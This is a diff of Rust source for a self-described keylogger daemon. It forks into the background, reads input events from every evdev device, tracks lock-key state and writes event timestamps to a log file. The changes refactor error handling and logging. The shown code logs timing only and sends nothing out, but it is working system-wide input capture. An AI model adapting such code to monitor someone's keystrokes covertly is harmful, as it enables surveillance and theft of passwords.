@@ -1,10 +1,16 @@
-use std::{env, path::PathBuf, process::exit, time::UNIX_EPOCH};
+use std::{
+    env,
+    path::{Path, PathBuf},
+    process::exit,
+    time::UNIX_EPOCH,
+};
 
-use anyhow::{bail, Context, Result};
+use anyhow::{bail, Context, Error, Result};
 use chrono::Local;
-use daemonize::Daemonize;
+use daemonize::{Daemonize, Outcome, Stdio};
 use evdev::{Device, InputEvent, InputEventKind, Key, LedType};
-use log::{debug, error, info, trace};
+use log::{debug, error, trace, LevelFilter};
+use simplelog::{Config, SimpleLogger};
 use tokio::{
     fs::{self, File, OpenOptions},
     io::AsyncWriteExt,
@@ -64,65 +70,60 @@ impl State {
     }
 }
 
-/// .
+/// Creates keylogger daemon service. Will fork off a process and calls [run()]
 ///
-/// # Panics
+/// # Errors
 ///
-/// Panics if .
-pub fn run() -> ! {
-    trace!("Creating stdio files for daemon loging");
-    let stdout = match std::fs::File::create("./tmpout")
-        .with_context(|| "Failed to create and open stdio file for daemon")
-    {
-        Ok(f) => f,
-        Err(err) => {
-            error!("{err:?}");
-            exit(1);
-        }
-    };
-    let stderr = match std::fs::File::create("./tmperr")
-        .with_context(|| "Failed to create and open stdio file for daemon")
-    {
-        Ok(f) => f,
-        Err(err) => {
-            error!("{err:?}");
-            exit(1);
-        }
-    };
-
+/// This function will return an error if daemon creation failed.
+pub fn create() -> Result<()> {
     let daemonizer = Daemonize::new()
-        .pid_file("./tmp.pid")
-        .stdout(stdout)
-        .stderr(stderr)
+        .pid_file("/run/keylogger.pid")
         .privileged_action(|| "Executed before drop privileges");
 
-    match daemonizer.start().with_context(|| "Failed to start daemon") {
-        Err(err) => {
-            error!("{err:?}");
+    match daemonizer.execute() {
+        Outcome::Parent(res) => {
+            res.with_context(|| "Failed to start daemon")?;
         }
-        Ok(_) => {
-            if let Err(err) = main() {
-                error!("{err:?}");
-            }
+        Outcome::Child(res) => {
+            error!(
+                "{:?}",
+                if let Err(err) = res.with_context(|| "Daemon failed to start") {
+                    err
+                } else {
+                    debug!("Daemon started succesfully");
+                    if let Err(err) = run().with_context(|| "Fatal error") {
+                        err
+                    } else {
+                        Error::msg("Unknown error occured")
+                    }
+                }
+            );
+            exit(1);
         }
     }
 
-    info!("Closing");
-    exit(1)
+    Ok(())
 }
 
+/// Runs the keylogger in the current process
+///
+/// # Errors
+///
+/// This function will return an error if a fatal error occurred, mean the keylogger could not
+/// recover from the error.
 #[tokio::main]
-async fn main() -> Result<()> {
+pub async fn run() -> Result<()> {
+    trace!("keylogger starting");
     let devices: Vec<Device> = evdev::enumerate().map(|t| t.1).collect();
 
     if devices.is_empty() {
-        bail!("Coundn't find any device. Sudo Please");
+        bail!("Coundn't find any device.");
     }
 
-    let initial_state: State = get_keyboard_state(&devices)?;
+    let initial_state: State =
+        get_keyboard_state(&devices).with_context(|| "Failed to initialize keyboard state")?;
 
-    let mut join_set = JoinSet::new();
-    let rx = spawn_device_listeners(devices, &mut join_set);
+    let (rx, mut join_set) = spawn_device_listeners(devices);
 
     join_set.spawn(async move {
         spawn_event_reader(rx, initial_state).await?;
@@ -137,7 +138,8 @@ async fn main() -> Result<()> {
 }
 
 fn get_keyboard_state(devices: &[Device]) -> Result<State> {
-    let led_state: evdev::AttributeSet<LedType> = devices
+    // let led_state: evdev::AttributeSet<LedType> = devices
+    let led_device = devices
         .iter()
         .find(|device| {
             let Some(leds) = device.supported_leds() else {
@@ -147,8 +149,8 @@ fn get_keyboard_state(devices: &[Device]) -> Result<State> {
                 .iter()
                 .all(|led| leds.contains(*led))
         })
-        .and_then(|device| device.get_led_state().ok())
-        .with_context(|| "Couldn't find device to read caps and num lock from")?;
+        .ok_or_else(|| Error::msg("Couldn't find device to read caps and num lock from"))?;
+    let led_state = led_device.get_led_state()?;
 
     Ok(State::new(
         led_state.contains(LedType::LED_CAPSL),
@@ -156,15 +158,13 @@ fn get_keyboard_state(devices: &[Device]) -> Result<State> {
     ))
 }
 
-fn spawn_device_listeners(
-    devices: Vec<Device>,
-    join_map: &mut JoinSet<Result<()>>,
-) -> Receiver<InputEvent> {
+fn spawn_device_listeners(devices: Vec<Device>) -> (Receiver<InputEvent>, JoinSet<Result<()>>) {
     let (tx, rx) = mpsc::channel(32);
+    let mut join_set = JoinSet::<Result<()>>::new();
 
     for device in devices {
         let tx = tx.clone();
-        join_map.spawn(async move {
+        join_set.spawn(async move {
             let mut stream = device
                 .into_event_stream()
                 .with_context(|| "Failed to create device stream")?;
@@ -173,14 +173,14 @@ fn spawn_device_listeners(
                     .next_event()
                     .await
                     .with_context(|| "Failed to read event")?;
-                if tx.send(event).await.is_err() {
-                    bail!("Failed to send event");
-                }
+                tx.send(event)
+                    .await
+                    .with_context(|| "Failed to send event")?;
             }
         });
     }
 
-    rx
+    (rx, join_set)
 }
 
 async fn open_log_file() -> Result<File> {
@@ -215,13 +215,16 @@ async fn spawn_event_reader(mut rx: Receiver<InputEvent>, initial_state: State) 
 
     while let Some(eventr) = rx.recv().await {
         let time = eventr.timestamp();
-        let t = time.duration_since(UNIX_EPOCH).unwrap().as_nanos();
+        let t = time
+            .duration_since(UNIX_EPOCH)
+            .with_context(|| "UNIX_EPOCHE is after the timestamp of the event???")?
+            .as_nanos();
         log_file
             .write_all(format!("{t}\n").as_bytes())
             .await
             .with_context(|| "Failed to write to log")?;
         state.update(eventr);
-        println!("{eventr:?}");
+        trace!("{eventr:?}");
     }
     bail!("Event receiver was closed")
 }
